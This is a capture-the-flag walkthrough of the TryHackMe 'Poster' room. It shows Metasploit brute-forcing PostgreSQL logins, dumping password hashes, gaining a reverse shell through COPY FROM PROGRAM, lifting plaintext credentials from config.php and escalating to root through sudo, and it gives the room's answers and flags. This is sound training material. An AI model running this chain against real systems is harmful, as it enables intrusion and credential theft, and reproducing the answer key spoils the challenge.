---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - metasploit
  - brute-force
  - sudo-abuse
---

# Poster
![Poster logo](logos/poster_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Poster](https://tryhackme.com/room/poster)  

## Description
"The sys admin set up a rdbms in a safe way.  

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

Are you able to complete the challenge?"

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.022s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 3.13 (96%), Linux 4.4 (95%), Linux 5.4 (95%), Amazon Fire TV (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
??? success "What is the rdbms installed on the server?"
	postgresql
??? success "What port is the rdbms running on?"
	5432

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* No `robots.txt` or `sitemap` files  
* Nothing interesting in the source code  
* Web page reveals static email signup page  
* `ffuf` scan reveals `/images` and `/assets` directories: no interesting content  

### Vulnerability Enumeration
```
searchsploit OpenSSH 7.2p2	# Only result: username enumeration
searchsploit httpd 2.4.18	# Only result: DoS
```

## Foothold
```
msfconsole
msf > search postgresql
```
??? success "After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?"
	auxiliary/scanner/postgres/postgres_login
```
msf > use scanner/postgres/postgres_login
msf auxiliary(scanner/postgres/postgres_login) > set rhosts TARGET_IP_ADDRESS
msf auxiliary(scanner/postgres/postgres_login) > set stop_on_success true
msf auxiliary(scanner/postgres/postgres_login) > run
<OMITTED FOR BREVITY>
[+] TARGET_IP_ADDRESS:5432    - TARGET_IP_ADDRESS:5432 - Login Successful: <OMITTED>
[*] TARGET_IP_ADDRESS:5432    - Scanned 1 of 1 hosts (100% complete)
[*] TARGET_IP_ADDRESS:5432    - Bruteforce completed, 1 credential was successful.
[*] TARGET_IP_ADDRESS:5432    - You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
??? success "What are the credentials you found?"
	postgres:password

```
msf > search postgresql
```
??? success "What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?"
	auxiliary/admin/postgres/postgres_sql

```
msf > use auxiliary/scanner/postgres/postgres_version
msf auxiliary(scanner/postgres/postgres_version) > set password password
password => password
msf auxiliary(scanner/postgres/postgres_version) > set rhosts TARGET_IP_ADDRESS
rhosts => TARGET_IP_ADDRESS
msf auxiliary(scanner/postgres/postgres_version) > exploit
[*] TARGET_IP_ADDRESS:5432 - TARGET_IP_ADDRESS:5432 Postgres - Version PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit (Post-Auth)
[*] TARGET_IP_ADDRESS:5432 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
??? success "Based on the results of #6, what is the rdbms version installed on the server?"
	9.5.21

```
msf > search hashdump
```
??? success "What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?"
	auxiliary/scanner/postgres/postgres_hashdump

```
msf > use auxiliary/scanner/postgres/postgres_hashdump
msf auxiliary(scanner/postgres/postgres_hashdump) > set password password
password => password
msf auxiliary(scanner/postgres/postgres_hashdump) > set rhosts TARGET_IP_ADDRESS
rhosts => TARGET_IP_ADDRESS
msf auxiliary(scanner/postgres/postgres_hashdump) > exploit
[+] TARGET_IP_ADDRESS:5432 - Query appears to have run successfully
[+] TARGET_IP_ADDRESS:5432 - Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] TARGET_IP_ADDRESS:5432 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
??? success "How many user hashes does the module dump?"
	6

```
msf > search postgresql
```
??? success "What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?"
	auxiliary/admin/postgres/postgres_readfile
??? success "What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?"
	exploit/multi/postgres/postgres_copy_from_program_cmd_exec

```
msf > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password password
password => password
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhosts TARGET_IP_ADDRESS
rhosts => TARGET_IP_ADDRESS
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost ATTACKER_IP_ADDRESS
lhost => ATTACKER_IP_ADDRESS
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > exploit
*] Started reverse TCP handler on ATTACKER_IP_ADDRESS:4444 
[*] TARGET_IP_ADDRESS:5432 - TARGET_IP_ADDRESS:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] TARGET_IP_ADDRESS:5432 - Exploiting...
[+] TARGET_IP_ADDRESS:5432 - TARGET_IP_ADDRESS:5432 - SEQ4jo90QU dropped successfully
[+] TARGET_IP_ADDRESS:5432 - TARGET_IP_ADDRESS:5432 - SEQ4jo90QU created successfully
[+] TARGET_IP_ADDRESS:5432 - TARGET_IP_ADDRESS:5432 - SEQ4jo90QU copied successfully(valid syntax/command)
[+] TARGET_IP_ADDRESS:5432 - TARGET_IP_ADDRESS:5432 - SEQ4jo90QU dropped successfully(Cleaned)
[*] TARGET_IP_ADDRESS:5432 - Exploit Succeeded
[*] Command shell session 1 opened (ATTACKER_IP_ADDRESS:4444 -> TARGET_IP_ADDRESS:53950) at 2026-04-28 17:24:31 -0400

shell

postgres@ubuntu:/var/lib/postgresql/9.5/main$ find / -name user.txt 2>/dev/null
/home/alison/user.txt
postgres@ubuntu:/var/lib/postgresql/9.5/main$ ls -al /home/alison/user.txt
-rw------- 1 alison alison 35 Jul 28  2020 /home/alison/user.txt
postgres@ubuntu:/var/lib/postgresql/9.5/main$ ls -al /var 
total 48
drwxr-xr-x 12 root root   4096 Jul 28  2020 .
drwxr-xr-x 22 root root   4096 Jul 28  2020 ..
drwxr-xr-x  2 root root   4096 Apr 28 22:57 backups
drwxr-xr-x 11 root root   4096 Jul 29  2020 cache
drwxr-xr-x 41 root root   4096 Jul 28  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 12  2016 local
lrwxrwxrwx  1 root root      9 Jul 28  2020 lock -> /run/lock
drwxrwxr-x 10 root syslog 4096 Jul 28  2020 log
drwxrwsr-x  2 root mail   4096 Feb 26  2019 mail
drwxr-xr-x  2 root root   4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root      4 Jul 28  2020 run -> /run
drwxr-xr-x  4 root root   4096 Jul 28  2020 spool
drwxrwxrwt  4 root root   4096 Apr 28 22:57 tmp
drwxr-xr-x  3 root root   4096 Jul 28  2020 www
postgres@ubuntu:/var/lib/postgresql/9.5/main$ ls -al /var/www
total 12
drwxr-xr-x  3 root root 4096 Jul 28  2020 .
drwxr-xr-x 12 root root 4096 Jul 28  2020 ..
drwxr-xr-x  3 root root 4096 Jul 28  2020 html
postgres@ubuntu:/var/lib/postgresql/9.5/main$ ls -al /var/www/html
total 16
drwxr-xr-x 3 root   root   4096 Jul 28  2020 .
drwxr-xr-x 3 root   root   4096 Jul 28  2020 ..
-rwxrwxrwx 1 alison alison  123 Jul 28  2020 config.php
drwxr-xr-x 4 alison alison 4096 Jul 28  2020 poster
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cat /var/www/html/config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>postgres@ubuntu:/var/lib/postgresql/9.5/main$ su alison

alison@ubuntu:/var/lib/postgresql/9.5/main$ cd ~
alison@ubuntu:~$ cat user.txt
```
??? success "Compromise the machine and locate user.txt"
	THM{postgresql_fa1l_conf1gurat1on}

## Privilege Escalation
```
alison@ubuntu:~$ sudo -l
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:~$ sudo bash

root@ubuntu:~# ls -al /root
total 24
drwx------  3 root root 4096 Jul 28  2020 .
drwxr-xr-x 22 root root 4096 Jul 28  2020 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Jul 28  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   49 Jul 28  2020 root.txt
root@ubuntu:~# cat /root/root.txt
```
??? success "Escalate privileges and obtain root.txt"
	THM{c0ngrats_for_read_the_f1le_w1th_credent1als}

**Tools Used**  
`msfconsole`

**Date completed:** 28/04/26  
**Date published:** 29/04/26